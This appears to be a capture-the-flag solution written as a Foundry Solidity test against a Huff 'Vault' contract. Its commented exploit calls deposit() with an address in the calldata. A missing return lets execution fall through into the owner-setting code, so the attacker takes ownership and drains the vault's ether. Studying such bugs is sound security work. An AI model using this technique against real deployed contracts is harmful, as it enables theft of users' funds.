// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";

interface Vault {
    function setOwner(address) external returns (bool);
    function deposit() external;
    function withdraw() external;
}

contract SolutionTest is Test {
    Vault public vault;

    address constant hacker = payable(address(0xbadbabe));

    function setUp() public {
        vault = Vault(HuffDeployer.config().with_value(111 ether).deploy{value: 111 ether}("Vault"));
        vm.deal(hacker, 0.2 ether); // give the hacker a little beer money
    }

    function testHackAttempt1() public {
        vm.startPrank(hacker);
        // Try sending 0x69696969 as first 4 bytes to trigger to get into NOT_A_RUG_PULL()
        // and then send 0x46 as the calldata so that it will get past the loop
        bytes memory payload = abi.encodeWithSelector(bytes4(0x69696969), 0x46);
        vm.expectRevert(); // This attempt reverts!
        (bool success, bytes memory returnData) = address(vault).call{value: 0.001 ether}(payload);
        // After the "come and take it" WITHDRAW() line, there is no return or JUMP so it continues to execute
        // down to the not_valid JUMPDEST and then reverts on the next line.  So close!!
    }

    function testSolution() public {
        uint startingVaultBal = address(vault).balance;
        uint startingHackerBal = hacker.balance;

        vm.startPrank(hacker);
        // Call deposit() and send any amount of Ether (it reverts if you msg.value == 0!)
        // Deposit doesn't take any arguments but we will include the hacker's address in the first
        // calldata spot after the deposit func sig.
        bytes memory payload = abi.encodeWithSelector(Vault.deposit.selector, address(hacker));
        // The DEPOSIT() macro does not end with a return (or revert) or a JUMP.
        // Since Huff just inlines the function, it will continue to execute the following lines.
        // set_owner: is a JUMPDEST and the next line after is the SET_OWNER() macros.  Normally,
        // the only way to get to SET_OWNER() is by calling it with the setOwner() func sig,
        // and there is an AUTHTHENTICATE() check to make sure the caller is the owner.
        //
        // But this bug leads us right into the SET_OWNER() code, and looky looky, we've got an address in
        // the calldata ready to be used by the fn to set our friendly neighborhood hacker as the new owner.
        (bool success, bytes memory returnData) = address(vault).call{value: 0.001 ether}(payload);
        require(success);

        // Now that Ms. Hacker is the owner, she can just casually call withdraw() to drain the contract.
        vault.withdraw();

        assertEq(hacker.balance, startingHackerBal + startingVaultBal);
        assertEq(address(vault).balance, 0x00);
    }
}

